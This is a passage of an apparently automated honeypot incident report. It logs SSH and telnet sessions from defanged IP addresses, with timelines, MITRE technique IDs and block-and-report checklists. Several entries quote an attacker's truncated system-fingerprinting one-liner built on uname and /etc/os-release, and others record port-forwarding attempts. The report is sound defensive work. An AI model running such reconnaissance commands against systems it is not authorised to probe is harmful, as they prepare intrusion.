**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:30:26` | `cowrie.session.connect` |
| `2026-08-20 17:30:26` | `cowrie.client.version` |
| `2026-08-20 17:30:26` | `cowrie.client.kex` |
| `2026-08-20 17:30:28` | `cowrie.login.success` |
| `2026-08-20 17:30:29` | `cowrie.session.params` |
| `2026-08-20 17:30:29` | `cowrie.command.input` |
| `2026-08-20 17:30:29` | `cowrie.command.input` |
| `2026-08-20 17:30:29` | `cowrie.command.input` |
| `2026-08-20 17:30:29` | `cowrie.command.input` |
| `2026-08-20 17:30:29` | `cowrie.command.input` |
| `2026-08-20 17:30:29` | `cowrie.command.success` |
| `2026-08-20 17:30:29` | `cowrie.command.input` |
| `2026-08-20 17:30:29` | `cowrie.command.input` |
| `2026-08-20 17:30:29` | `cowrie.command.input` |
| `2026-08-20 17:30:29` | `cowrie.command.input` |
| `2026-08-20 17:30:29` | `cowrie.log.closed` |
| `2026-08-20 17:30:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d44dc0754144

| Field | Detail |
|---|---|
| **Source IP** | `195.158.26[.]59` |
| **First Seen** | 2026-08-20 17:31 |
| **Last Seen** | 2026-08-20 17:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:31:55` | `cowrie.session.connect` |
| `2026-08-20 17:31:56` | `cowrie.client.version` |
| `2026-08-20 17:31:56` | `cowrie.client.kex` |
| `2026-08-20 17:31:58` | `cowrie.login.success` |
| `2026-08-20 17:31:59` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:32:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.158.26[.]59` to AbuseIPDB if not already reported
- [ ] Block `195.158.26[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b216e5cc8c4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:32 |
| **Last Seen** | 2026-08-20 17:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:32:00` | `cowrie.session.connect` |
| `2026-08-20 17:32:01` | `cowrie.client.version` |
| `2026-08-20 17:32:01` | `cowrie.client.kex` |
| `2026-08-20 17:32:02` | `cowrie.login.success` |
| `2026-08-20 17:32:03` | `cowrie.session.params` |
| `2026-08-20 17:32:03` | `cowrie.command.input` |
| `2026-08-20 17:32:03` | `cowrie.command.input` |
| `2026-08-20 17:32:03` | `cowrie.command.input` |
| `2026-08-20 17:32:03` | `cowrie.command.input` |
| `2026-08-20 17:32:03` | `cowrie.command.input` |
| `2026-08-20 17:32:03` | `cowrie.command.success` |
| `2026-08-20 17:32:03` | `cowrie.command.input` |
| `2026-08-20 17:32:03` | `cowrie.command.input` |
| `2026-08-20 17:32:03` | `cowrie.command.input` |
| `2026-08-20 17:32:03` | `cowrie.command.input` |
| `2026-08-20 17:32:04` | `cowrie.log.closed` |
| `2026-08-20 17:32:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97b1470b4b5d

| Field | Detail |
|---|---|
| **Source IP** | `220.178.39[.]106` |
| **First Seen** | 2026-08-20 17:32 |
| **Last Seen** | 2026-08-20 17:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:32:04` | `cowrie.session.connect` |
| `2026-08-20 17:32:05` | `cowrie.client.version` |
| `2026-08-20 17:32:05` | `cowrie.client.kex` |
| `2026-08-20 17:32:07` | `cowrie.login.success` |
| `2026-08-20 17:32:08` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:32:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.178.39[.]106` to AbuseIPDB if not already reported
- [ ] Block `220.178.39[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d9be982aa00

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:33 |
| **Last Seen** | 2026-08-20 17:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:33:35` | `cowrie.session.connect` |
| `2026-08-20 17:33:36` | `cowrie.client.version` |
| `2026-08-20 17:33:36` | `cowrie.client.kex` |
| `2026-08-20 17:33:37` | `cowrie.login.success` |
| `2026-08-20 17:33:38` | `cowrie.session.params` |
| `2026-08-20 17:33:38` | `cowrie.command.input` |
| `2026-08-20 17:33:38` | `cowrie.command.input` |
| `2026-08-20 17:33:38` | `cowrie.command.input` |
| `2026-08-20 17:33:38` | `cowrie.command.input` |
| `2026-08-20 17:33:38` | `cowrie.command.input` |
| `2026-08-20 17:33:38` | `cowrie.command.success` |
| `2026-08-20 17:33:38` | `cowrie.command.input` |
| `2026-08-20 17:33:38` | `cowrie.command.input` |
| `2026-08-20 17:33:38` | `cowrie.command.input` |
| `2026-08-20 17:33:38` | `cowrie.command.input` |
| `2026-08-20 17:33:39` | `cowrie.log.closed` |
| `2026-08-20 17:33:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1fce8f54701

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:35 |
| **Last Seen** | 2026-08-20 17:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:35:11` | `cowrie.session.connect` |
| `2026-08-20 17:35:12` | `cowrie.client.version` |
| `2026-08-20 17:35:12` | `cowrie.client.kex` |
| `2026-08-20 17:35:13` | `cowrie.login.success` |
| `2026-08-20 17:35:14` | `cowrie.session.params` |
| `2026-08-20 17:35:14` | `cowrie.command.input` |
| `2026-08-20 17:35:14` | `cowrie.command.input` |
| `2026-08-20 17:35:14` | `cowrie.command.input` |
| `2026-08-20 17:35:14` | `cowrie.command.input` |
| `2026-08-20 17:35:14` | `cowrie.command.input` |
| `2026-08-20 17:35:14` | `cowrie.command.success` |
| `2026-08-20 17:35:14` | `cowrie.command.input` |
| `2026-08-20 17:35:14` | `cowrie.command.input` |
| `2026-08-20 17:35:14` | `cowrie.command.input` |
| `2026-08-20 17:35:14` | `cowrie.command.input` |
| `2026-08-20 17:35:14` | `cowrie.log.closed` |
| `2026-08-20 17:35:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb919b9d2618

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:36 |
| **Last Seen** | 2026-08-20 17:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:36:51` | `cowrie.session.connect` |
| `2026-08-20 17:36:51` | `cowrie.client.version` |
| `2026-08-20 17:36:51` | `cowrie.client.kex` |
| `2026-08-20 17:36:52` | `cowrie.login.success` |
| `2026-08-20 17:36:53` | `cowrie.session.params` |
| `2026-08-20 17:36:53` | `cowrie.command.input` |
| `2026-08-20 17:36:53` | `cowrie.command.input` |
| `2026-08-20 17:36:53` | `cowrie.command.input` |
| `2026-08-20 17:36:53` | `cowrie.command.input` |
| `2026-08-20 17:36:53` | `cowrie.command.input` |
| `2026-08-20 17:36:53` | `cowrie.command.success` |
| `2026-08-20 17:36:53` | `cowrie.command.input` |
| `2026-08-20 17:36:53` | `cowrie.command.input` |
| `2026-08-20 17:36:53` | `cowrie.command.input` |
| `2026-08-20 17:36:53` | `cowrie.command.input` |
| `2026-08-20 17:36:53` | `cowrie.log.closed` |
| `2026-08-20 17:36:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3f53c2a8e54

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:38 |
| **Last Seen** | 2026-08-20 17:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:38:37` | `cowrie.session.connect` |
| `2026-08-20 17:38:37` | `cowrie.client.version` |
| `2026-08-20 17:38:37` | `cowrie.client.kex` |
| `2026-08-20 17:38:38` | `cowrie.login.success` |
| `2026-08-20 17:38:39` | `cowrie.session.params` |
| `2026-08-20 17:38:39` | `cowrie.command.input` |
| `2026-08-20 17:38:39` | `cowrie.command.input` |
| `2026-08-20 17:38:39` | `cowrie.command.input` |
| `2026-08-20 17:38:39` | `cowrie.command.input` |
| `2026-08-20 17:38:39` | `cowrie.command.input` |
| `2026-08-20 17:38:39` | `cowrie.command.success` |
| `2026-08-20 17:38:39` | `cowrie.command.input` |
| `2026-08-20 17:38:39` | `cowrie.command.input` |
| `2026-08-20 17:38:39` | `cowrie.command.input` |
| `2026-08-20 17:38:39` | `cowrie.command.input` |
| `2026-08-20 17:38:40` | `cowrie.log.closed` |
| `2026-08-20 17:38:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1237efe1054e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 17:39 |
| **Last Seen** | 2026-08-20 17:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:39:23` | `cowrie.session.connect` |
| `2026-08-20 17:39:24` | `cowrie.client.version` |
| `2026-08-20 17:39:24` | `cowrie.client.kex` |
| `2026-08-20 17:39:25` | `cowrie.login.success` |
| `2026-08-20 17:39:27` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:39:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 17:39:27` | `cowrie.direct-tcpip.data` |
| `2026-08-20 17:39:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fb02d8698bb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 17:39 |
| **Last Seen** | 2026-08-20 17:40 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:39:59` | `cowrie.session.connect` |
| `2026-08-20 17:39:59` | `cowrie.client.version` |
| `2026-08-20 17:40:00` | `cowrie.client.kex` |
| `2026-08-20 17:40:00` | `cowrie.login.success` |
| `2026-08-20 17:40:01` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:40:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 17:40:14` | `cowrie.direct-tcpip.data` |
| `2026-08-20 17:40:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c73b8bffed7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:40 |
| **Last Seen** | 2026-08-20 17:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:40:29` | `cowrie.session.connect` |
| `2026-08-20 17:40:29` | `cowrie.client.version` |
| `2026-08-20 17:40:29` | `cowrie.client.kex` |
| `2026-08-20 17:40:30` | `cowrie.login.success` |
| `2026-08-20 17:40:31` | `cowrie.session.params` |
| `2026-08-20 17:40:31` | `cowrie.command.input` |
| `2026-08-20 17:40:31` | `cowrie.command.input` |
| `2026-08-20 17:40:31` | `cowrie.command.input` |
| `2026-08-20 17:40:31` | `cowrie.command.input` |
| `2026-08-20 17:40:31` | `cowrie.command.input` |
| `2026-08-20 17:40:31` | `cowrie.command.success` |
| `2026-08-20 17:40:31` | `cowrie.command.input` |
| `2026-08-20 17:40:31` | `cowrie.command.input` |
| `2026-08-20 17:40:31` | `cowrie.command.input` |
| `2026-08-20 17:40:31` | `cowrie.command.input` |
| `2026-08-20 17:40:31` | `cowrie.log.closed` |
| `2026-08-20 17:40:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f06c14ae7a5c

| Field | Detail |
|---|---|
| **Source IP** | `34.41.211[.]48` |
| **First Seen** | 2026-08-20 17:40 |
| **Last Seen** | 2026-08-20 17:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:40:45` | `cowrie.session.connect` |
| `2026-08-20 17:40:46` | `cowrie.client.version` |
| `2026-08-20 17:40:46` | `cowrie.client.kex` |
| `2026-08-20 17:40:47` | `cowrie.login.success` |
| `2026-08-20 17:40:48` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:40:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.41.211[.]48` to AbuseIPDB if not already reported
- [ ] Block `34.41.211[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4303a70a556

| Field | Detail |
|---|---|
| **Source IP** | `39.164.91[.]67` |
| **First Seen** | 2026-08-20 17:40 |
| **Last Seen** | 2026-08-20 17:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:40:53` | `cowrie.session.connect` |
| `2026-08-20 17:40:54` | `cowrie.client.version` |
| `2026-08-20 17:40:54` | `cowrie.client.kex` |
| `2026-08-20 17:40:56` | `cowrie.login.success` |
| `2026-08-20 17:40:57` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:41:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.164.91[.]67` to AbuseIPDB if not already reported
- [ ] Block `39.164.91[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2d7c447ca84

| Field | Detail |
|---|---|
| **Source IP** | `104.236.83[.]40` |
| **First Seen** | 2026-08-20 17:40 |
| **Last Seen** | 2026-08-20 17:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:40:56` | `cowrie.session.connect` |
| `2026-08-20 17:40:56` | `cowrie.telnet.option` |
| `2026-08-20 17:40:56` | `cowrie.telnet.option` |
| `2026-08-20 17:41:56` | `cowrie.login.success` |
| `2026-08-20 17:41:57` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `104.236.83[.]40` to AbuseIPDB if not already reported
- [ ] Block `104.236.83[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a31d6a58ee9c

| Field | Detail |
|---|---|
| **Source IP** | `1.212.225[.]99` |
| **First Seen** | 2026-08-20 17:40 |
| **Last Seen** | 2026-08-20 17:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:40:58` | `cowrie.session.connect` |
| `2026-08-20 17:40:59` | `cowrie.client.version` |
| `2026-08-20 17:40:59` | `cowrie.client.kex` |
| `2026-08-20 17:41:00` | `cowrie.login.success` |
| `2026-08-20 17:41:01` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:41:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.212.225[.]99` to AbuseIPDB if not already reported
- [ ] Block `1.212.225[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-145f79b427b8

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]128` |
| **First Seen** | 2026-08-20 17:41 |
| **Last Seen** | 2026-08-20 17:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:41:06` | `cowrie.session.connect` |
| `2026-08-20 17:41:07` | `cowrie.client.version` |
| `2026-08-20 17:41:07` | `cowrie.client.kex` |
| `2026-08-20 17:41:10` | `cowrie.login.success` |
| `2026-08-20 17:41:11` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:41:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]128` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]128` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68de6b9dee4d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-20 17:41 |
| **Last Seen** | 2026-08-20 17:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:41:11` | `cowrie.session.connect` |
| `2026-08-20 17:41:11` | `cowrie.client.version` |
| `2026-08-20 17:41:11` | `cowrie.client.kex` |
| `2026-08-20 17:41:11` | `cowrie.login.success` |
| `2026-08-20 17:41:11` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:41:12` | `cowrie.direct-tcpip.data` |
| `2026-08-20 17:41:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f45a53e4ce9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:42 |
| **Last Seen** | 2026-08-20 17:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:42:25` | `cowrie.session.connect` |
| `2026-08-20 17:42:25` | `cowrie.client.version` |
| `2026-08-20 17:42:25` | `cowrie.client.kex` |
| `2026-08-20 17:42:26` | `cowrie.login.success` |
| `2026-08-20 17:42:27` | `cowrie.session.params` |
| `2026-08-20 17:42:27` | `cowrie.command.input` |
| `2026-08-20 17:42:27` | `cowrie.command.input` |
| `2026-08-20 17:42:27` | `cowrie.command.input` |
| `2026-08-20 17:42:27` | `cowrie.command.input` |
| `2026-08-20 17:42:27` | `cowrie.command.input` |
| `2026-08-20 17:42:27` | `cowrie.command.success` |
| `2026-08-20 17:42:27` | `cowrie.command.input` |
| `2026-08-20 17:42:27` | `cowrie.command.input` |
